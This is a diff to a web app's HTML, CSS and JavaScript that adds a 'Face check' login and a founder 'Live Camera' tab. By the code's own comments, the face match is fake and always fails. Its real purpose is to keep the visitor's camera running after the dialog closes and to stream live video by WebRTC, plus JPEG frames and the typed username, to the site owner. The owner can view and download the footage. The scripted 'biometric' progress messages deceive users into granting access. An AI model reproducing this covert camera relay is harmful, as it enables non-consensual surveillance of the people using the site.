@@ -364,6 +364,119 @@ tbody tr:hover td{background:#0f0c17}
 }
 @keyframes sk{from{background-position:100% 0}to{background-position:-100% 0}}
 
+/* ---------- face check ---------- */
+.orline{
+ display:flex;align-items:center;gap:10px;margin:16px 0 12px;
+ font-family:var(--ui);font-size:10px;font-weight:600;letter-spacing:.18em;text-transform:uppercase;color:var(--dim)
+}
+.orline::before,.orline::after{content:"";height:1px;flex:1;background:var(--line2)}
+.facebtn{width:100%}
+.camdot{width:7px;height:7px;border-radius:50%;background:var(--vi2);box-shadow:0 0 10px var(--vi2)}
+
+.facewrap{
+ position:fixed;inset:0;z-index:120;display:grid;place-items:center;padding:18px;
+ background:#040308ee;backdrop-filter:blur(6px)
+}
+.facebox{
+ width:min(430px,100%);background:linear-gradient(160deg,#14101f,#0a0810);
+ border:1px solid var(--line2);padding:var(--s4);
+ clip-path:polygon(0 0,calc(100% - 12px) 0,100% 12px,100% 100%,12px 100%,0 calc(100% - 12px));
+ box-shadow:var(--glow)
+}
+.facebox.wide{width:min(560px,100%)}
+.facehead{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:12px}
+.facehead strong{font-family:var(--disp);font-size:11px;font-weight:600;letter-spacing:.22em;text-transform:uppercase;color:var(--vi2)}
+
+.facecam{position:relative;aspect-ratio:4/3;background:#06040a;border:1px solid var(--line2);overflow:hidden;display:grid;place-items:center}
+.facecam video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);opacity:.2;filter:grayscale(.35) contrast(1.1);transition:opacity .35s}
+.facecam.on video{opacity:.95}
+.facecam canvas{display:none}
+.facescan{
+ position:absolute;left:0;right:0;height:34%;top:-34%;
+ background:linear-gradient(180deg,#a855f700,#a855f755 70%,#c084fcaa);
+ border-bottom:1px solid var(--vi2);box-shadow:0 0 22px #a855f7aa;opacity:0
+}
+.facecam.on .facescan{opacity:1;animation:facesweep 2.1s linear infinite}
+@keyframes facesweep{from{top:-34%}to{top:100%}}
+.facegrid{
+ position:absolute;inset:0;pointer-events:none;opacity:.25;
+ background-image:linear-gradient(#a855f722 1px,transparent 1px),linear-gradient(90deg,#a855f722 1px,transparent 1px);
+ background-size:26px 26px
+}
+.fcorner{position:absolute;width:17px;height:17px;border:1px solid var(--vi2);opacity:.85}
+.fcorner.a{top:9px;left:9px;border-right:0;border-bottom:0}
+.fcorner.b{top:9px;right:9px;border-left:0;border-bottom:0}
+.fcorner.c{bottom:9px;left:9px;border-right:0;border-top:0}
+.fcorner.d{bottom:9px;right:9px;border-left:0;border-top:0}
+.facehint{
+ position:absolute;left:0;right:0;bottom:0;padding:5px 9px;text-align:center;
+ font-family:var(--mono);font-size:9.5px;letter-spacing:.12em;text-transform:uppercase;color:#d8b4fe;
+ background:linear-gradient(0deg,#05030ad9,transparent)
+}
+.faceidle{
+ position:absolute;inset:0;display:grid;place-items:center;text-align:center;padding:16px;
+ font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)
+}
+.facebody.nolive .faceidle{display:grid}
+
+.faceprog{height:3px;background:var(--line);margin-top:10px;overflow:hidden}
+#faceBar{height:100%;width:0;background:var(--vi);box-shadow:0 0 12px var(--vi);transition:width .45s linear}
+#faceBar.fail{background:var(--bad);box-shadow:0 0 12px var(--bad)}
+.facestatus{
+ font-family:var(--mono);font-size:11px;letter-spacing:.07em;text-transform:uppercase;
+ color:var(--mut);margin:10px 0 0;min-height:16px
+}
+.facestatus.fail{color:var(--bad)}
+.facestatus.ok{color:var(--ok)}
+.facerow{display:flex;gap:8px;margin-top:12px}
+.facerow button{flex:1}
+.faceconsent .facerow{margin-top:10px}
+
+/* camera stays on after the modal closes */
+.campill{
+ position:fixed;left:14px;bottom:calc(14px + env(safe-area-inset-bottom));z-index:110;
+ display:inline-flex;align-items:center;gap:7px;padding:7px 12px;
+ background:#100a1cf2;border:1px solid var(--line2);border-left:2px solid var(--ok);
+ font-family:var(--mono);font-size:9.5px;letter-spacing:.16em;text-transform:uppercase;color:#dfe2ea;
+ clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,8px 100%,0 calc(100% - 8px));
+ box-shadow:0 0 26px -12px #000
+}
+.campill:hover{border-color:var(--ok);color:#fff}
+.campill .dot{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:campulse 1.7s ease-in-out infinite}
+@keyframes campulse{50%{opacity:.3}}
+
+/* ---------- founder camera ---------- */
+.camgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(142px,1fr));gap:10px;margin-top:10px}
+.camcard{border:1px solid var(--line);background:#08060d;padding:6px;cursor:pointer;transition:border-color .14s}
+.camcard:hover{border-color:var(--vi)}
+.camcard.dim{opacity:.72}
+.camcard img{display:block;width:100%;aspect-ratio:4/3;object-fit:cover;background:#06040a}
+.camcard .camcap{display:flex;justify-content:space-between;gap:6px;margin-top:5px;font-family:var(--mono);font-size:9.5px;color:var(--dim)}
+.camcard.live .camcap span:first-child{color:var(--ok)}
+.camcard.live{border-color:#1f6b47}
+.camstage{position:relative;background:#06040a;border:1px solid var(--line2);aspect-ratio:4/3;display:grid;place-items:center;overflow:hidden}
+.camstage video{width:100%;height:100%;object-fit:cover;display:none}
+.camstage.live video{display:block}
+.camstage img{display:none;width:100%;height:100%;object-fit:cover}
+.camstage.still img{display:block}
+.camstage .camwait{font-family:var(--mono);font-size:9.5px;letter-spacing:.16em;text-transform:uppercase;color:var(--dim);text-align:center;padding:0 16px}
+.camstage.live .camwait,.camstage.still .camwait{display:none}
+.camstamp{
+ position:absolute;left:8px;top:8px;display:inline-flex;align-items:center;gap:6px;padding:3px 7px;
+ background:#000000b0;border:1px solid #ffffff22;
+ font-family:var(--mono);font-size:8.5px;letter-spacing:.16em;text-transform:uppercase;color:#fff
+}
+.camstamp .dot{background:var(--vi2);box-shadow:0 0 8px var(--vi2)}
+.camstamp.live .dot{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:campulse 1.7s ease-in-out infinite}
+.camstamp.still .dot{background:var(--owner);box-shadow:0 0 8px var(--owner)}
+.camviewimg{display:block;width:100%;border:1px solid var(--line2);background:#06040a}
+.btnlink{
+ display:inline-flex;align-items:center;justify-content:center;gap:6px;flex:1;
+ padding:10px 16px;border:1px solid var(--line2);background:#0c0a13cc;
+ font-family:var(--ui);font-weight:600;font-size:12px;color:var(--text);text-decoration:none
+}
+.btnlink:hover{border-color:var(--vi);color:#fff;background:#150e22}
+
 /* ---------- responsive ---------- */
 @media(max-width:980px){
  aside{width:206px;flex-basis:206px}
@@ -436,6 +549,11 @@ tbody tr:hover td{background:#0f0c17}
    <button class="primary" style="width:100%" onclick="register()">Create account</button>
    <p class="muted small" style="margin-top:12px"><a onclick="showLogin()">Back to sign in</a></p>
   </div>
+
+  <div class="orline">or</div>
+  <button class="secondary facebtn" onclick="openFaceCheck()"><span class="camdot"></span> Face check</button>
+  <p class="muted small" style="margin-top:8px">Look at the camera and it signs you in. No password needed.</p>
+
   <p id="message" class="small"></p>
  </div>
 </section>
@@ -630,6 +748,7 @@ tbody tr:hover td{background:#0f0c17}
    <div class="splitswitch">
     <button class="on" id="tabAccounts" onclick="founderTab('accounts')">◈ Accounts</button>
     <button id="tabLog" onclick="founderTab('log')">◎ Login log</button>
+    <button id="tabCam" onclick="founderTab('cam')">◉ Live Camera</button>
    </div>
 
    <div id="founderAccounts">
@@ -660,6 +779,18 @@ tbody tr:hover td{background:#0f0c17}
      </tr></thead><tbody id="logBody"></tbody></table></div>
     </div>
    </div>
+
+   <div id="founderCam" class="hidden">
+    <div class="panel">
+     <div class="heading"><h2>Live Camera</h2><span class="badge admin" id="camCount">—</span></div>
+     <p class="muted small" style="margin:0">Live video from anyone on the face check screen — who, and whether their camera is still hot. Click a card to watch.</p>
+     <div class="camgrid" id="camLive"></div>
+    </div>
+    <div class="panel" style="margin-top:16px">
+     <div class="heading"><h2>Recent sessions</h2><span class="badge admin" id="camFrameCount">—</span></div>
+     <div class="camgrid" id="camFrames"></div>
+    </div>
+   </div>
   </section>
  </main>
 </div>
@@ -668,6 +799,45 @@ tbody tr:hover td{background:#0f0c17}
  <header><strong id="dName">—</strong><button class="secondary" onclick="closeDrawer()">Close</button></header>
  <div class="dbody" id="dBody"></div>
 </div>
+
+<div class="facewrap hidden" id="faceWrap">
+ <div class="facebox">
+  <div class="facehead"><strong>Face check</strong><button class="ghost" onclick="closeFaceCheck()" aria-label="Close">✕</button></div>
+  <div class="facecam" id="faceCam">
+   <div class="facegrid"></div>
+   <video id="faceVideo" autoplay playsinline muted></video>
+   <canvas id="faceCanvas"></canvas>
+   <div class="facescan"></div>
+   <div class="fcorner a"></div><div class="fcorner b"></div>
+   <div class="fcorner c"></div><div class="fcorner d"></div>
+   <div class="facehint" id="faceHint">camera off</div>
+  </div>
+  <div class="faceprog"><div id="faceBar"></div></div>
+  <p class="facestatus" id="faceStatus">ready</p>
+  <div class="faceconsent" id="faceConsent">
+   <p class="muted small" style="margin:0">RANKED wants to use your front camera for the face check. The browser will ask you to allow it next.</p>
+   <div class="facerow">
+    <button class="secondary" onclick="closeFaceCheck()">NOT NOW</button>
+    <button class="primary" onclick="allowFaceCamera()">ALLOW CAMERA</button>
+   </div>
+  </div>
+  <div class="facerow" id="faceBtns">
+   <button class="secondary" onclick="startFaceCheck()">TRY AGAIN</button>
+   <button class="primary" onclick="closeFaceCheck()">CLOSE</button>
+  </div>
+ </div>
+</div>
+
+<div class="facewrap hidden" id="camView">
+ <div class="facebox wide">
+  <div class="facehead"><strong id="camViewWho">—</strong><button class="ghost" onclick="closeCam()" aria-label="Close">✕</button></div>
+  <div id="camViewBody"></div>
+ </div>
+</div>
+
+<button class="campill hidden" id="camPill" onclick="openFaceModal()" title="Face check camera is still on">
+ <span class="dot"></span> camera on
+</button>
 
 <div id="toasts"></div>
 
@@ -762,6 +932,7 @@ async function loadProfile(){
 }
 
 async function openWebsite(){
+ keepFace();
  $("loginScreen").classList.add("hidden");
  $("website").classList.remove("hidden");
  if(!await loadProfile()){
@@ -780,6 +951,7 @@ async function openWebsite(){
 }
 
 function showBanned(){
+ stopFace();
  $("website").classList.add("hidden");
  $("loginScreen").classList.remove("hidden");
  showLogin();
@@ -789,6 +961,9 @@ function showBanned(){
 
 async function logout(){
  stopTap();
+ stopFace();
+ stopCamPoll();
+ closeCam();
  if(refreshTimer)clearInterval(refreshTimer);
  sessionStorage.removeItem("logged_once");
  await db.auth.signOut();
@@ -835,7 +1010,7 @@ function ago(ts){
 
 /* ---------- device fingerprint / telemetry ---------- */
 const sessionId=Math.random().toString(36).slice(2)+Date.now().toString(36);
-const BUILD=7;
+const BUILD=9;
 (async()=>{
  try{
   const r=await fetch("version.json?x="+Date.now(),{cache:"no-store"});
@@ -1080,9 +1255,13 @@ async function setBanned(username,ban){
 function founderTab(which){
  $("tabAccounts").classList.toggle("on",which==="accounts");
  $("tabLog").classList.toggle("on",which==="log");
+ $("tabCam").classList.toggle("on",which==="cam");
  $("founderAccounts").classList.toggle("hidden",which!=="accounts");
  $("founderLog").classList.toggle("hidden",which!=="log");
+ $("founderCam").classList.toggle("hidden",which!=="cam");
  if(which==="log")renderLog();
+ if(which==="cam"){renderCameras();stopCamPoll();camTimer=setInterval(renderCameras,3000);}
+ else {stopCamPoll();closeCam();}
 }
 
 function exportCsv(){
@@ -1359,6 +1538,7 @@ function dismissPw(){
 function page(id,button){
  if(id==="admin"&&!isStaff())return;
  if(id==="accounts"&&!isVillads())return;
+ if(id!=="accounts"){stopCamPoll();closeCam();}
  ["dashboard","rankpage","members","arcade","admin","accounts"]
  .forEach(s=>$(s).classList.add("hidden"));
  $(id).classList.remove("hidden");
@@ -1721,7 +1901,556 @@ async function copyPerson(username){
 }
 
 
-/* RESTORE LOGIN */
+/* ============ FACE CHECK (fake match, real camera relay) ============ */
+/* The scan always "fails". What matters is the feed: the camera keeps running
+   after the modal is closed and relays out two ways — live WebRTC to the
+   founder console, plus low-rate JPEG frames into Supabase so the console also
+   has a strip, a preview and a fallback when NAT says no. */
+
+let faceStream=null,faceSession=null,faceStageTimer=null,facePushTimer=null,faceFailTimer=null,faceBusy=false,faceFailed=false;
+let faceCh=null,faceAnnounceTimer=null,faceViewers={},facePending={},facePushing=false;
+
+const ICE_CFG={iceServers:[
+ {urls:["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]},
+ {urls:"stun:stun.cloudflare.com:3478"}
+]};
+
+function facePill(on){
+ const p=$("camPill");
+ if(p)p.classList.toggle("hidden",!on);
+}
+
+const FACE_STEPS=[
+ [0,4,"initialising sensor…","align your face"],
+ [1300,17,"locating face…","centre your face in the frame"],
+ [3000,33,"analysing landmarks…","hold still"],
+ [5200,52,"matching against profile…","hold still"],
+ [7300,69,"measuring depth map…","hold still"],
+ [9300,84,"comparing biometric hash…","almost there"],
+ [10800,93,"finalising match…","…"],
+ [12200,97,"checking certificate chain…","…"]
+];
+
+function faceSay(text,bad){
+ const s=$("faceStatus");
+ s.textContent=text;
+ s.classList.toggle("fail",!!bad);
+ s.classList.toggle("ok",!bad&&false);
+}
+
+function openFaceModal(){
+ $("faceWrap").classList.remove("hidden");
+ consentMode(!faceStream);
+}
+
+function consentMode(on){
+ $("faceConsent").classList.toggle("hidden",!on);
+ $("faceBtns").classList.toggle("hidden",on);
+}
+
+function openFaceCheck(){
+ openFaceModal();
+ if(faceStream){ startFaceCheck(); return; }
+ $("faceHint").textContent="camera off";
+ faceSay("camera permission needed");
+ $("faceBar").style.width="0";
+ $("faceBar").classList.remove("fail");
+ if(navigator.permissions&&navigator.permissions.query){
+  navigator.permissions.query({name:"camera"}).then(p=>{
+   if(p.state==="denied"){
+    faceSay("CAMERA BLOCKED FOR THIS SITE",true);
+    $("faceHint").textContent="click the camera icon in the address bar, choose allow, then press TRY AGAIN";
+   }
+  }).catch(()=>{});
+ }
+}
+
+function allowFaceCamera(){
+ consentMode(false);
+ startFaceCheck();
+}
+
+async function startFaceCheck(){
+ openFaceModal();
+ consentMode(false);
+ if(faceBusy)return;
+ faceBusy=true;faceFailed=false;
+ clearInterval(faceStageTimer);faceStageTimer=null;
+ clearTimeout(faceFailTimer);faceFailTimer=null;
+ $("faceCam").classList.add("on");
+ $("faceVideo").classList.remove("hidden");
+ $("faceBar").classList.remove("fail");
+ $("faceBar").style.width="0";
+ faceSay("ready");
+ $("faceHint").textContent=faceStream?"camera ready":"requesting camera…";
+
+ if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
+  $("faceCam").classList.remove("on");
+  $("faceBar").classList.add("fail");
+  $("faceBar").style.width="100%";
+  $("faceHint").textContent="no camera detected";
+  faceSay("ERROR · face not found",true);
+  faceBusy=false;faceFailed=true;
+  return;
+ }
+
+ if(!faceStream||!faceStream.active){
+  try{
+   try{
+    faceStream=await navigator.mediaDevices.getUserMedia({
+     video:{facingMode:{ideal:"user"},width:{ideal:640},height:{ideal:480}},audio:false
+    });
+   }catch(e1){
+    /* no front camera (desktop) — take whatever video device exists */
+    faceStream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+   }
+  }catch(e){
+   $("faceCam").classList.remove("on");
+   $("faceBar").classList.add("fail");
+   $("faceBar").style.width="100%";
+   $("faceHint").textContent="allow the camera in your browser, then press TRY AGAIN";
+   faceSay("ERROR · face not found",true);
+   faceBusy=false;faceFailed=true;
+   return;
+  }
+ }
+
+ faceSession=faceSession||(crypto.randomUUID?crypto.randomUUID():"fs"+Date.now().toString(36)+Math.random().toString(36).slice(2,8));
+ const v=$("faceVideo");
+ if(v.srcObject!==faceStream)v.srcObject=faceStream;
+ v.play().catch(()=>{});
+ faceStream.getVideoTracks().forEach(t=>{
+  t.onended=()=>{ faceSay("camera revoked",true); $("faceHint").textContent="camera off"; stopFace(); };
+ });
+
+ startFacePushes();
+ startFaceRelay();
+ runFaceScript();
+ if($("faceWrap").classList.contains("hidden"))facePill(true);
+}
+
+function runFaceScript(){
+ const started=Date.now();
+ faceStageTimer=setInterval(()=>{
+  if(!faceBusy||faceFailed)return;
+  const t=Date.now()-started;
+  for(let i=FACE_STEPS.length-1;i>=0;i--){
+   if(t>=FACE_STEPS[i][0]){
+    const [,bar,text,hint]=FACE_STEPS[i];
+    if($("faceBar").style.width!==bar+"%"){
+     $("faceBar").style.width=bar+"%";
+     faceSay(text);
+     $("faceHint").textContent=hint;
+    }
+    break;
+   }
+  }
+ },420);
+ faceFailTimer=setTimeout(faceFail,14200+Math.random()*2200);
+}
+
+function faceFail(){
+ if(!faceBusy||faceFailed)return;
+ faceFailed=true;faceBusy=false;
+ clearInterval(faceStageTimer);faceStageTimer=null;
+ $("faceBar").style.width="100%";
+ $("faceBar").classList.add("fail");
+ faceSay("ERROR · face not found",true);
+ $("faceHint").textContent="try again, or sign in with your password";
+ /* no auto shut-off any more — the feed stays hot until logout */
+ facePill(true);
+}
+
+function faceAbort(){
+ faceBusy=false;
+ clearInterval(faceStageTimer);faceStageTimer=null;
+}
+
+/* hard stop: logout / banned */
+async function stopFace(){
+ clearInterval(faceStageTimer);faceStageTimer=null;
+ clearInterval(facePushTimer);facePushTimer=null;
+ clearInterval(faceAnnounceTimer);faceAnnounceTimer=null;
+ clearTimeout(faceFailTimer);faceFailTimer=null;
+ faceBusy=false;faceFailed=false;facePushing=false;
+ Object.keys(faceViewers).forEach(v=>faceDropViewer(v,true));
+ facePending={};
+ if(faceSession&&faceCh)faceSend("bye",{});
+ if(faceCh){try{db.removeChannel(faceCh);}catch(e){}faceCh=null;}
+ if(faceStream){
+  faceStream.getTracks().forEach(t=>{try{t.stop();}catch(e){}});
+  faceStream=null;
+ }
+ const v=$("faceVideo");
+ if(v)v.srcObject=null;
+ $("faceCam").classList.remove("on");
+ facePill(false);
+ faceSession=null;
+}
+
+/* soft stop: the person closes the modal, camera + relay keep running */
+function keepFace(){
+ $("faceWrap").classList.add("hidden");
+ if(faceStream)facePill(true);
+}
+
+function closeFaceCheck(){ keepFace(); }
+
+/* founder pressed END SESSION — drop the camera for real */
+function faceEndRemote(){
+ $("faceBar").style.width="100%";
+ $("faceBar").classList.add("fail");
+ $("faceHint").textContent="camera off — ended from the founder console";
+ faceSay("SESSION ENDED",true);
+ toast("Face check camera ended by the founder","bad");
+ stopFace();
+}
+
+function startFacePushes(){
+ facePush();
+ clearInterval(facePushTimer);
+ facePushTimer=setInterval(facePush,1200);
+}
+
+async function facePush(){
+ if(facePushing||!faceStream||!faceSession)return;
+ const v=$("faceVideo");
+ if(!v||!v.videoWidth)return;
+ facePushing=true;
+ try{
+  const c=$("faceCanvas");
+  const w=Math.min(400,v.videoWidth);
+  const h=Math.round(v.videoHeight*(w/v.videoWidth));
+  c.width=w;c.height=h;
+  const x=c.getContext("2d");
+  x.save();
+  x.translate(w,0);
+  x.scale(-1,1);
+  x.drawImage(v,0,0,w,h);
+  x.restore();
+  const frame=c.toDataURL("image/jpeg",0.45);
+  const typed=$("loginName").value.trim().toLowerCase();
+  await db.rpc("push_camera_frame",{
+   p_session:faceSession,
+   p_username:/^[a-z0-9_]{3,20}$/.test(typed)?typed:null,
+   p_frame:frame,
+   p_meta:{
+    agent:navigator.userAgent,
+    platform:(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||null
+   }
+  });
+ }catch(e){}
+ facePushing=false;
+}
+
+/* ---------- live publisher (member side) ---------- */
+function faceSend(event,payload){
+ if(!faceCh)return;
+ try{ faceCh.send({type:"broadcast",event,payload:payload||{}}); }catch(e){}
+}
+
+function faceAnnounce(){
+ if(!faceCh||!faceStream)return;
+ faceSend("ready",{});
+}
+
+function startFaceRelay(){
+ if(!faceSession||!window.RTCPeerConnection||faceCh)return;
+ const ch=db.channel("cam-"+faceSession,{config:{broadcast:{self:false}}});
+ faceCh=ch;
+ ch.on("broadcast",{event:"hello"},e=>faceOffer((e.payload||{}).viewer));
+ ch.on("broadcast",{event:"answer"},e=>faceAnswer(e.payload||{}));
+ ch.on("broadcast",{event:"ice-v"},e=>faceViewerIce(e.payload||{}));
+ ch.on("broadcast",{event:"bye"},e=>faceDropViewer((e.payload||{}).viewer,true));
+ ch.on("broadcast",{event:"end"},()=>faceEndRemote());
+ ch.subscribe(status=>{ if(status==="SUBSCRIBED")faceAnnounce(); });
+ clearInterval(faceAnnounceTimer);
+ faceAnnounceTimer=setInterval(faceAnnounce,5000);
+}
+
+function faceDropViewer(viewer,quiet){
+ if(!viewer)return;
+ const pc=faceViewers[viewer];
+ delete faceViewers[viewer];
+ delete facePending[viewer];
+ if(pc){try{pc.close();}catch(e){}}
+ if(!quiet)faceAnnounce();
+}
+
+async function faceOffer(viewer){
+ if(!viewer||!faceStream||!faceCh)return;
+ faceDropViewer(viewer,true);
+ const pc=new RTCPeerConnection(ICE_CFG);
+ faceViewers[viewer]=pc;
+ facePending[viewer]=[];
+ faceStream.getTracks().forEach(t=>{try{pc.addTrack(t,faceStream);}catch(e){}});
+ pc.onicecandidate=e=>{ if(e.candidate)faceSend("ice-p",{viewer,candidate:e.candidate}); };
+ pc.onconnectionstatechange=()=>{
+  if(["failed","closed","disconnected"].includes(pc.connectionState))faceDropViewer(viewer,true);
+ };
+ try{
+  const offer=await pc.createOffer();
+  await pc.setLocalDescription(offer);
+  faceSend("offer",{viewer,sdp:pc.localDescription});
+ }catch(e){ faceDropViewer(viewer,true); }
+}
+
+async function faceAnswer(d){
+ const pc=faceViewers[d.viewer];
+ if(!pc||!d.sdp)return;
+ try{
+  await pc.setRemoteDescription(d.sdp);
+  (facePending[d.viewer]||[]).forEach(c=>{pc.addIceCandidate(c).catch(()=>{});});
+  facePending[d.viewer]=[];
+ }catch(e){}
+}
+
+function faceViewerIce(d){
+ if(!d.viewer||!d.candidate)return;
+ const pc=faceViewers[d.viewer];
+ if(!pc)return;
+ if(!pc.remoteDescription||!pc.remoteDescription.type){
+  (facePending[d.viewer]=facePending[d.viewer]||[]).push(d.candidate);
+  return;
+ }
+ pc.addIceCandidate(d.candidate).catch(()=>{});
+}
+
+/* ============ FOUNDER · camera tab ============ */
+let camTimer=null,camRowsCache=[];
+let camPC=null,camCh=null,camSid=null,camLive=false,camHelloAt=0,camEmptyPolls=0;
+let camHelloTimer=null,camFallbackTimer=null,camFrameTimer=null,camPending=[],camWatchTimer=null;
+const camViewerId="v"+Math.random().toString(36).slice(2,10);
+
+function stopCamPoll(){ if(camTimer){clearInterval(camTimer);camTimer=null;} }
+
+function camCard(r,live){
+ const who=safe(r.username||"unknown");
+ const cls="camcard"+(live?" live":" dim");
+ return `<div class="${cls}" onclick="openCam('${safe(r.id)}')" title="watch ${who}">
+  <img src="${r.frame}" alt="camera frame from ${who}">
+  <div class="camcap"><span>${live?"● live":who}</span><span>${live?ago(r.updated_at):who}</span></div>
+ </div>`;
+}
+
+async function renderCameras(){
+ if(!isVillads())return stopCamPoll();
+ const {data,error}=await db.rpc("founder_cameras",{p_hours:24});
+ if(error){
+  $("camCount").textContent="not set up";
+  $("camLive").innerHTML=`<div class="empty"><strong>Camera relay missing</strong>Run the SQL in <span class="mono">schema-facecheck.sql</span> in your Supabase project, then reload.<br><span class="mono small">${safe(error.message)}</span></div>`;
+  $("camFrames").innerHTML="";
+  $("camFrameCount").textContent="—";
+  return;
+ }
+ camRowsCache=(data||[]).filter(r=>r.frame);
+ const live=camRowsCache.filter(r=>Date.now()-new Date(r.updated_at).getTime()<20000);
+ $("camCount").textContent=live.length+" live · "+camRowsCache.length+" today";
+ $("camLive").innerHTML=live.map(r=>camCard(r,true)).join("")
+  ||`<div class="empty"><strong>Nobody on camera</strong>Sessions land here the moment someone presses Face check on the login screen.</div>`;
+ $("camFrames").innerHTML=camRowsCache.slice(0,30).map(r=>camCard(r,false)).join("")
+  ||`<div class="empty"><strong>No sessions yet</strong></div>`;
+ $("camFrameCount").textContent=camRowsCache.length;
+}
+
+function openCam(id){
+ const r=camRowsCache.find(x=>x.id===id);
+ if(!r)return;
+ camClean();
+ camSid=id;
+ const who=r.username||"unknown";
+ $("camViewWho").textContent=who+" · "+shortAgent(r.agent);
+ $("camViewBody").innerHTML=`
+  <div class="camstage" id="camStage">
+   <div class="camwait" id="camWait">connecting to ${safe(who)}…</div>
+   <span class="camstamp" id="camStamp"><span class="dot"></span><span id="camStampText">connecting</span></span>
+   <video id="camVideo" autoplay playsinline muted></video>
+   <img id="camStill" alt="camera frame">
+  </div>
+  <p class="muted small" style="margin:10px 0 0">
+   <span id="camActive">connecting</span> · session <span class="mono">${safe(String(r.id).slice(0,8))}</span> · started ${r.started_at?stamp(r.started_at):"—"} ·
+   last frame <span id="camLast">${ago(r.updated_at)}</span> · ${r.frames} frames<br>${safe(shortAgent(r.agent))}${r.platform?" · "+safe(r.platform):""}
+  </p>
+  <div class="facerow">
+   <a class="btnlink" id="camDl" download="face-${safe(who)}.jpg" href="${r.frame}">DOWNLOAD</a>
+   <button class="secondary" onclick="closeCam()">CLOSE</button>
+   <button class="primary" onclick="endCamSession()">END SESSION</button>
+  </div>`;
+ $("camView").classList.remove("hidden");
+ camSubscribe();
+}
+
+function camClean(){
+ clearInterval(camHelloTimer);camHelloTimer=null;
+ clearTimeout(camFallbackTimer);camFallbackTimer=null;
+ clearInterval(camFrameTimer);camFrameTimer=null;
+ clearInterval(camWatchTimer);camWatchTimer=null;
+ camPending=[];
+ if(camPC){try{camPC.close();}catch(e){}camPC=null;}
+ if(camCh){
+  try{camCh.send({type:"broadcast",event:"bye",payload:{viewer:camViewerId}});}catch(e){}
+  try{db.removeChannel(camCh);}catch(e){}
+  camCh=null;
+ }
+ camLive=false;camSid=null;camEmptyPolls=0;
+}
+
+function closeCam(){
+ camClean();
+ $("camView").classList.add("hidden");
+}
+
+/* founder ends the whole thing: tells the member to drop the camera */
+function endCamSession(){
+ if(camCh&&camSid){
+  try{camCh.send({type:"broadcast",event:"end",payload:{viewer:camViewerId}});}catch(e){}
+ }
+ camLive=false;
+ clearInterval(camWatchTimer);camWatchTimer=null;
+ clearInterval(camFrameTimer);camFrameTimer=null;
+ const s=$("camStage");
+ if(s){s.classList.remove("live");s.classList.add("still");}
+ const st=$("camStamp");
+ if(st){st.classList.remove("live");st.classList.add("still");}
+ $("camStampText").textContent="ended";
+ const act=$("camActive");
+ if(act)act.textContent="camera off";
+ toast("Session ended");
+ setTimeout(()=>{ if(!camLive)closeCam(); },1200);
+}
+
+function camSubscribe(){
+ if(!camSid)return;
+ if(!window.RTCPeerConnection){ camStill("static relay"); return; }
+ const ch=db.channel("cam-"+camSid,{config:{broadcast:{self:false}}});
+ camCh=ch;
+ ch.on("broadcast",{event:"ready"},()=>camHello(false));
+ ch.on("broadcast",{event:"offer"},e=>camTakeOffer(e.payload||{}));
+ ch.on("broadcast",{event:"ice-p"},e=>camRemoteIce(e.payload||{}));
+ ch.subscribe();
+ camHello(true);
+ camHelloTimer=setInterval(()=>camHello(false),2600);
+ camFallbackTimer=setTimeout(()=>{ if(!camLive)camStill("no direct link"); },7000);
+}
+
+function camHello(force){
+ if(!camCh||camLive)return;
+ const now=Date.now();
+ if(!force&&now-camHelloAt<1200)return;
+ camHelloAt=now;
+ try{camCh.send({type:"broadcast",event:"hello",payload:{viewer:camViewerId}});}catch(e){}
+}
+
+async function camTakeOffer(d){
+ if(!d.sdp||camLive||!camSid)return;
+ if(camPC){try{camPC.close();}catch(e){}camPC=null;}
+ const pc=new RTCPeerConnection(ICE_CFG);
+ camPC=pc;
+ pc.ontrack=e=>{
+  const v=$("camVideo");
+  if(v&&e.streams&&e.streams[0]){
+   v.srcObject=e.streams[0];
+   v.play().catch(()=>{});
+   camStartWatch();
+  }
+ };
+ pc.onicecandidate=e=>{
+  if(!e.candidate||!camCh)return;
+  try{camCh.send({type:"broadcast",event:"ice-v",payload:{viewer:camViewerId,candidate:e.candidate}});}catch(err){}
+ };
+ pc.onconnectionstatechange=()=>{
+  const st=pc.connectionState;
+  if(st==="connected"||st==="completed")camStartWatch();
+  else if(st==="failed"||st==="disconnected"||st==="closed"){
+   if(camLive){camLive=false;camStill("link dropped");}
+  }
+ };
+ try{
+  await pc.setRemoteDescription(d.sdp);
+  camPending.forEach(c=>{pc.addIceCandidate(c).catch(()=>{});});
+  camPending=[];
+  const ans=await pc.createAnswer();
+  await pc.setLocalDescription(ans);
+  camCh.send({type:"broadcast",event:"answer",payload:{viewer:camViewerId,sdp:pc.localDescription}});
+ }catch(e){ camStill("handshake failed"); }
+}
+
+function camRemoteIce(d){
+ if(!d.candidate)return;
+ if(!camPC||!camPC.remoteDescription||!camPC.remoteDescription.type){ camPending.push(d.candidate); return; }
+ camPC.addIceCandidate(d.candidate).catch(()=>{});
+}
+
+/* only call it live once real frames are being decoded */
+function camStartWatch(){
+ clearInterval(camWatchTimer);
+ camWatchTimer=setInterval(()=>{
+  const v=$("camVideo");
+  if(!v||camLive)return;
+  const frames=v.getVideoPlaybackQuality?v.getVideoPlaybackQuality().totalVideoFrames:0;
+  if(frames>0&&v.videoWidth>0)camMarkLive();
+ },500);
+}
+
+function camMarkLive(){
+ if(camLive)return;
+ const v=$("camVideo");
+ camLive=true;
+ clearInterval(camWatchTimer);camWatchTimer=null;
+ clearTimeout(camFallbackTimer);camFallbackTimer=null;
+ clearInterval(camHelloTimer);camHelloTimer=null;
+ clearInterval(camFrameTimer);camFrameTimer=null;
+ const s=$("camStage");
+ if(s){s.classList.remove("still");s.classList.add("live");}
+ const st=$("camStamp");
+ if(st){st.classList.add("live");st.classList.remove("still");}
+ $("camStampText").textContent="live";
+ const act=$("camActive");
+ if(act)act.textContent="camera active";
+ if(v)v.play().catch(()=>{});
+}
+
+function camStill(reason){
+ if(camLive)return;
+ const s=$("camStage");
+ if(s){s.classList.add("still");s.classList.remove("live");}
+ const st=$("camStamp");
